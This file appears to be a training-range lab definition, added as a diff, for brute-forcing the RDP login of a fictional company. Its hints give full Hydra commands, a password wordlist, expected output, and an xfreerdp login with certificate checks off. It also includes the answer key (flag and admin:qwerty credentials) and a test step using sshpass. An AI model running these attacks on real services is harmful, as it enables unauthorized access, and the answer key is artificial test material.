@@ -1,0 +1,357 @@
+name: RDP Brute Force Attack
+description: Perform automated brute force attacks against FinanceCorp's RDP service to test password strength.
+difficulty: intermediate
+category: credential-attacks
+duration_minutes: 120
+objectives:
+  - brute force rdp credentials
+  - Understand Windows penetration testing techniques
+  - Capture the flag
+
+scenario: |
+  Your credential testing against FinanceCorp's RDP service has revealed potential 
+  authentication weaknesses. James Mitchell wants to understand if automated brute 
+  force attacks could compromise RDP access, as this represents a significant 
+  security risk.
+  
+  Brute force attacks systematically test many password combinations to discover weak 
+  credentials. FinanceCorp needs to know if their password policies are sufficient 
+  to resist such attacks on RDP services.
+  
+  Your objective: Perform automated brute force attacks against FinanceCorp's RDP 
+  service. Test password strength and identify if weak passwords can be discovered 
+  through systematic credential testing.
+
+flag: "OCR{rdp_brut3_f0rc3}"
+
+hints:
+  - text: |
+      ## What is an RDP Brute Force Attack?
+
+      A **brute force attack** is an automated method of systematically testing many
+      username and password combinations against a service until valid credentials are
+      found. Unlike manual credential guessing, brute force attacks use **wordlists**
+      and specialized tools to test hundreds or thousands of combinations automatically.
+
+      ### Why Brute Force Attacks Matter
+
+      Brute force attacks are one of the most common attack vectors against RDP:
+
+      - **RDP is frequently exposed**: Many organizations expose RDP to the internet
+        for remote work, making it a prime target
+      - **Weak passwords are prevalent**: Despite password policies, users continue
+        to choose weak, guessable passwords
+      - **Automated tooling is freely available**: Tools like Hydra, Medusa, and
+        Crowbar make brute force attacks trivially easy
+      - **Real-world impact**: RDP brute force is a leading initial access vector
+        for ransomware groups (e.g., Dharma, Phobos, REvil)
+
+      ### Brute Force Attack Types
+
+      | Type                | Description                                       |
+      |--------------------|----------------------------------------------------|
+      | Dictionary attack  | Tests passwords from a wordlist file               |
+      | Credential stuffing| Uses leaked username:password pairs                |
+      | Password spraying  | Tests one password against many usernames           |
+      | Hybrid attack      | Combines dictionary words with mutations           |
+
+      In this lab, you will use **Hydra** to perform a dictionary-based brute force
+      attack against the FinanceCorp RDP service.
+    unlock_after_minutes: 0
+
+  - text: |
+      ## Tool Introduction: Hydra
+
+      **Hydra** (THC-Hydra) is a fast, flexible, and widely-used network login
+      brute force tool. It supports over 50 protocols including RDP, SSH, FTP,
+      HTTP, SMB, and many more.
+
+      ### Installation
+
+      ```bash
+      sudo apt update && sudo apt install hydra -y
+      ```
+
+      ### Basic Syntax
+
+      ```bash
+      hydra [options] <target> <protocol>
+      ```
+
+      ### Key Hydra Options
+
+      | Option             | Purpose                                          |
+      |--------------------|--------------------------------------------------|
+      | `-l <user>`        | Specify a single username                        |
+      | `-L <file>`        | Specify a file containing usernames              |
+      | `-p <pass>`        | Specify a single password                        |
+      | `-P <file>`        | Specify a file containing passwords (wordlist)   |
+      | `-t <tasks>`       | Number of parallel connections (default: 16)     |
+      | `-V`               | Verbose mode - show each attempt                 |
+      | `-f`               | Stop after first valid credential found          |
+      | `-s <port>`        | Specify a non-default port                       |
+      | `-o <file>`        | Write results to an output file                  |
+      | `-w <seconds>`     | Wait time between attempts                       |
+
+      ### Supported RDP Protocol Names
+
+      In Hydra, RDP is specified as the protocol `rdp`:
+
+      ```bash
+      hydra -l admin -P passwords.txt <target> rdp
+      ```
+
+      ### Alternative Tools
+
+      - **Crowbar** (formerly Levye): Specifically designed for RDP brute force
+      - **Medusa**: Another parallel login brute forcer
+      - **Ncrack**: From the nmap project, supports RDP
+    unlock_after_minutes: 5
+
+  - text: |
+      ## Wordlists and Practical RDP Brute Force Considerations
+
+      ### Wordlists
+
+      The effectiveness of a brute force attack depends heavily on your wordlist.
+      Common wordlist sources:
+
+      **Built-in wordlists (Kali/Parrot):**
+      ```
+      /usr/share/wordlists/rockyou.txt          (14 million passwords)
+      /usr/share/seclists/Passwords/            (various targeted lists)
+      /usr/share/wordlists/fasttrack.txt        (small, common passwords)
+      /usr/share/nmap/nselib/data/passwords.lst (nmap default passwords)
+      ```
+
+      **Creating a custom wordlist for this lab:**
+
+      For a targeted attack, create a small wordlist with the most common passwords:
+
+      ```bash
+      cat > /tmp/passwords.txt << 'EOF'
+      password
+      password123
+      admin
+      admin123
+      qwerty
+      letmein
+      welcome
+      changeme
+      123456
+      P@ssw0rd
+      EOF
+      ```
+
+      ### RDP-Specific Brute Force Considerations
+
+      - **Speed**: RDP authentication is slower than protocols like SSH or FTP.
+        Each attempt takes 1-3 seconds, so large wordlists are impractical
+      - **Account lockout**: Many systems lock accounts after 3-5 failed attempts.
+        Use `-t 1` to reduce parallel connections and `-w 5` for delays
+      - **NLA (Network Level Authentication)**: If enabled, authentication happens
+        before the session is created, which is actually faster for brute forcing
+      - **xrdp specifics**: xrdp uses PAM for authentication, so Linux account
+        lockout policies (pam_faillock) may apply
+
+      ### Hydra and RDP Modules
+
+      Hydra's RDP module uses the FreeRDP library under the hood. Ensure
+      `libfreerdp` is installed for the RDP module to work properly.
+    unlock_after_minutes: 10
+
+  - text: |
+      ## Step-by-Step Workflow for This Lab
+
+      ### Step 1: Verify the RDP Service
+
+      ```bash
+      nmap -p 3389 -sV -Pn <target>
+      ```
+
+      Confirm port 3389 is open and running xrdp.
+
+      ### Step 2: Install Required Tools
+
+      ```bash
+      sudo apt update && sudo apt install hydra freerdp2-x11 -y
+      ```
+
+      ### Step 3: Create a Password Wordlist
+
+      ```bash
+      cat > /tmp/passwords.txt << 'EOF'
+      password
+      password123
+      admin
+      admin123
+      qwerty
+      letmein
+      welcome1
+      changeme
+      123456
+      P@ssw0rd
+      EOF
+      ```
+
+      ### Step 4: Run Hydra Against RDP
+
+      ```bash
+      hydra -l admin -P /tmp/passwords.txt -t 1 -V -f <target> rdp
+      ```
+
+      Flags: `-l` username, `-P` wordlist, `-t 1` single thread, `-V` verbose, `-f` stop on success.
+
+      ### Step 5: Analyze Output and Connect
+
+      Look for `[3389][rdp] host: <target>  login: admin  password: <found>` in the output,
+      then connect with the discovered credentials:
+
+      ```bash
+      xfreerdp /v:<target> /u:admin /p:<discovered_password> /cert:ignore +clipboard
+      ```
+
+      Retrieve the flag from the remote system.
+    unlock_after_minutes: 15
+
+  - text: |
+      ## Exact Commands to Run
+
+      ### Install Tools
+
+      ```bash
+      sudo apt update && sudo apt install hydra freerdp2-x11 -y
+      ```
+
+      ### Create the Password Wordlist
+
+      ```bash
+      cat > /tmp/passwords.txt << 'EOF'
+      password
+      password123
+      admin
+      admin123
+      qwerty
+      letmein
+      welcome1
+      changeme
+      123456
+      P@ssw0rd
+      EOF
+      ```
+
+      ### Run the Brute Force Attack
+
+      ```bash
+      hydra -l admin -P /tmp/passwords.txt -t 1 -V -f <target> rdp
+      ```
+
+      Watch the output carefully. Hydra will display each attempt and highlight
+      any successful login in **green** with the format:
+
+      ```
+      [3389][rdp] host: <target>   login: admin   password: <found_password>
+      ```
+
+      ### Connect with Discovered Credentials
+
+      Once Hydra finds valid credentials, connect via RDP:
+
+      ```bash
+      xfreerdp /v:<target> /u:admin /p:qwerty /cert:ignore +clipboard /size:1280x720
+      ```
+
+      ### Retrieve the Flag
+
+      In the remote XFCE desktop, open a terminal and run:
+
+      ```bash
+      cat /home/admin/flag.txt
+      ```
+
+      Copy the `OCR{...}` flag and submit it.
+    unlock_after_minutes: 20
+
+  - text: |
+      ## Complete Solution Walkthrough
+
+      ### 1. Install Tools
+
+      ```bash
+      sudo apt update && sudo apt install hydra freerdp2-x11 -y
+      ```
+
+      ### 2. Create Wordlist and Run Hydra
+
+      ```bash
+      cat > /tmp/passwords.txt << 'EOF'
+      password
+      password123
+      admin
+      admin123
+      qwerty
+      letmein
+      welcome1
+      changeme
+      123456
+      P@ssw0rd
+      EOF
+      ```
+
+      ```bash
+      hydra -l admin -P /tmp/passwords.txt -t 1 -V -f <target> rdp
+      ```
+
+      ### 4. Expected Hydra Output
+
+      ```
+      [ATTEMPT] target <target> - login "admin" - pass "password" - 1 of 10
+      [ATTEMPT] target <target> - login "admin" - pass "qwerty" - 5 of 10
+      [3389][rdp] host: <target>   login: admin   password: qwerty
+      1 of 1 target successfully completed, 1 valid password found
+      ```
+
+      Hydra discovers **admin:qwerty** as the valid credential pair.
+
+      ### 5. Connect and Retrieve the Flag
+
+      ```bash
+      xfreerdp /v:<target> /u:admin /p:qwerty /cert:ignore +clipboard /size:1280x720
+      ```
+
+      Open a terminal in the remote desktop and run:
+
+      ```bash
+      cat /home/admin/flag.txt
+      ```
+
+      Submit the `OCR{...}` flag to complete the lab.
+
+      ### Security Implications
+
+      The password "qwerty" appears in every common password list. Hydra found
+      it in only 5 attempts, demonstrating why strong password policies are critical
+      for internet-facing RDP services.
+    unlock_after_minutes: 25
+
+credentials:
+  - username: "admin"
+    password: "qwerty"
+    role: "rdp-user"
+    description: "RDP admin credentials"
+
+workbook: "wiki/range/winpt/CH04_RDP_Exploitation/05_RDP_Brute_Force_Attack/"
+
+test:
+  steps:
+    - name: "Verify RDP port 3389 is open"
+      command: "nmap -Pn -p 3389 {target.target} | grep '3389/tcp'"
+      expect: "open"
+
+    - name: "Detect RDP service on port 3389"
+      command: "nmap -Pn -sV -p 3389 {target.target} | grep '3389/tcp'"
+      expect: "ms-wbt-server"
+
+    - name: "Retrieve flag via SSH"
+      command: "sshpass -p 'qwerty' ssh -o StrictHostKeyChecking=no admin@{target.target} cat /home/admin/flag.txt"
+      expect: "OCR{"
